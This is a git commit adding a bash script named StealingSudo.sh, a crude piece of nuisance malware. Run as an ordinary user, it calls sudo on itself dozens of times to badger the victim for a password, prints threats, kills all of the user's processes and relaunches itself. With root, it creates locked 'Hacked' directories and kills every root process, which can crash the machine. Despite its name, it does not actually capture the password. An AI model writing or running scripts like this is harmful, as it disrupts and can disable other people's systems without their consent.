089833c806242c120e825e717f7c25cf32604977
KadTheAad <69099988+KadTheAad@users.noreply.github.com>
2020-08-28 04:37:12 +0000

    Add files via upload

---
+++ StealingSudo.sh
@@ -0,0 +1,53 @@
+#! /bin/bash
+
+clear
+USER=$(whoami)
+if [[ $EUID -ne 0 ]]; then
+	sudo /home/$USER/StealingSudo.sh
+	sudo /home/$USER/StealingSudo.sh
+	sudo /home/$USER/StealingSudo.sh
+	sudo /home/$USER/StealingSudo.sh
+	sudo /home/$USER/StealingSudo.sh
+	sudo /home/$USER/StealingSudo.sh
+	sudo /home/$USER/StealingSudo.sh
+	sudo /home/$USER/StealingSudo.sh
+	sudo /home/$USER/StealingSudo.sh
+	sudo /home/$USER/StealingSudo.sh
+	sudo /home/$USER/StealingSudo.sh
+	sudo /home/$USER/StealingSudo.sh
+	sudo /home/$USER/StealingSudo.sh
+	sudo /home/$USER/StealingSudo.sh
+	sudo /home/$USER/StealingSudo.sh
+	sudo /home/$USER/StealingSudo.sh
+	sudo /home/$USER/StealingSudo.sh
+	sudo /home/$USER/StealingSudo.sh
+	sudo /home/$USER/StealingSudo.sh
+	sudo /home/$USER/StealingSudo.sh
+	sudo /home/$USER/StealingSudo.sh					
+	sudo /home/$USER/StealingSudo.sh
+	sudo /home/$USER/StealingSudo.sh
+	sudo exit
+	echo "Stop Or Else"
+	sudo /home/$USER/StealingSudo.sh
+	sudo /home/$USER/StealingSudo.sh
+	sudo /home/$USER/StealingSudo.sh
+	sudo exit
+	echo "You Made Me Do This"
+	sudo /home/$USER/StealingSudo.sh
+	sudo exit
+	bash -D
+	pkill -KILL -u $USER
+	sleep 5
+	./StealingSudo.sh
+else
+	sudo bash -D
+	sudo mkdir /root/Hacked
+	sudo mkdir /home/hacker
+	sudo firefox
+	firefox
+	sudo chmod 000 /root/Hacked
+	sudo chmod 000 /home/hacker
+	sudo mkdir /home/$USER/HACKEDLLLLLLLOOOOOOOOOOOOOOOOOOOOLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLOOOOOOOOOOOOOOOOOOOOOOOOOOLLLLLLLLLLLLLLOOOOOOOOOOOOOOOOOOOOOLLLLLLL
+	sudo chmod 000 /home/$USER/HACKEDLLLLLLLOOOOOOOOOOOOOOOOOOOOLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLOOOOOOOOOOOOOOOOOOOOOOOOOOLLLLLLLLLLLLLLOOOOOOOOOOOOOOOOOOOOOLLLLLLL
+	sudo pkill -KILL -u root
+fi
